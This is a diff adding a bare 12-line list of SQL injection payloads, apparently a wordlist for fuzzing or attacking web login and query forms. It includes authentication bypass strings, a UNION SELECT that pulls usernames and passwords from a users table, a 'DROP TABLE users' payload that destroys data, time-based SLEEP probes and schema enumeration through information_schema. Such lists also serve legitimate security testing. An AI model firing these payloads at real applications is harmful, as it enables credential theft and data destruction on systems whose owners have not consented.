@@ -1,0 +1,12 @@
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+admin'--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT username,password FROM users--
+1; DROP TABLE users--
+1' AND SLEEP(5)--
+' OR SLEEP(5)--
+' AND 1=0 UNION ALL SELECT NULL,table_name FROM information_schema.tables--
+%27 OR %271%27=%271
